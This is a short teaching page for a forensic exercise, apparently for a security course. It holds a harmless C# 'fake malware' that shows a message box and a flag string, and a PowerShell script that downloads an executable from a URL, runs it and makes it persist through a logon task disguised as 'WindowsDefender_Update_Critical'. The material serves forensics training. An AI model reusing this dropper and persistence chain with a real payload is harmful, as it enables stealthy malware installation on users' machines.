The code is compiled from this source code in C# :
```cs
using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SimulationForensic
{
    class Program
    {
        static volatile string secretFlag = "MALWARE{y0u hAV€ b&en P&nwd}";

        [STAThread]
        static void Main(string[] args)
        {
            string memoryAnchor = secretFlag; 

            MessageBox.Show("You are under attack !!\n\n(Ceci est une simulation forensic)", 
                            "CRITICAL ALERT", 
                            MessageBoxButtons.OK, 
                            MessageBoxIcon.Warning);
        }
    }
}
```
This is a powershell script which downloads, executes and sets persistence for this fake malware : 
```ps1
# ==========================================
# SIMULATION D'ATTAQUE FORENSIC
# ==========================================

Write-Host ">>> Démarrage de la chaine d'attaque simulée..." -ForegroundColor Red

# 1. GENERATION DE BRUIT RESEAU (Reconnaissance)
# Simule un check de connectivité (souvent utilisé par les malwares pour vérifier l'accès internet)
Write-Host "[*] Test de connexion vers C2 (simulé Google)..."
$net = Test-NetConnection -ComputerName 8.8.8.8 -Port 53
if($net.TcpTestSucceeded) { Write-Host " -> Connexion établie." -ForegroundColor Green }

# 2. TELECHARGEMENT DU PAYLOAD (Dropper)
# On définit le chemin de destination dans un dossier temporaire (comportement classique)
$DestPath = "$env:TEMP\FakeMalware.exe"
$Url = "https://github.com/VOTRE_USER/VOTRE_REPO/raw/main/FakeMalware.exe" # <--- REMPLACEZ CECI

Write-Host "[*] Téléchargement du payload depuis GitHub..."
try {
    # On utilise curl (Invoke-WebRequest) pour récupérer le binaire
    Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
    Write-Host " -> Payload téléchargé dans $DestPath" -ForegroundColor Green
}
catch {
    Write-Host " -> ERREUR de téléchargement. Vérifiez le lien." -ForegroundColor Red
    Exit
}

# 3. CREATION D'ARTEFACTS FICHIERS
# Création d'un faux dump ou fichier de config suspect
Write-Host "[*] Création de fichiers suspects..."
New-Item -Path "C:\Windows\Temp\config_dump.dat" -ItemType File -Force -Value "ENCRYPTED_DATA_HEADER..." | Out-Null

# 4. PERSISTANCE (Tâche Planifiée)
# Cette fois, la tâche pointe vers le malware téléchargé, pas Notepad.
Write-Host "[*] Installation de la persistance..."
$TaskName = "WindowsDefender_Update_Critical" # Nom trompeur pour l'analyste
$Action = New-ScheduledTaskAction -Execute $DestPath
$Trigger = New-ScheduledTaskTrigger -AtLogon
try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force | Out-Null
    Write-Host " -> Persistance établie : Tâche '$TaskName' créée." -ForegroundColor Green
}
catch {
    Write-Host " -> Erreur lors de la création de la tâche (nécessite Admin)." -ForegroundColor Yellow
}

# 5. EXECUTION DU MALWARE
Write-Host "[*] Exécution du payload..." -ForegroundColor Red
Start-Process -FilePath $DestPath

Write-Host ">>> ATTAQUE TERMINEE. Vous pouvez commencer l'analyse Forensic." -ForegroundColor Cyan
```

#### Warning
This is purely a demonstration and for learning content. It is, indeed, used for a presentation in a Computer Science Security Program
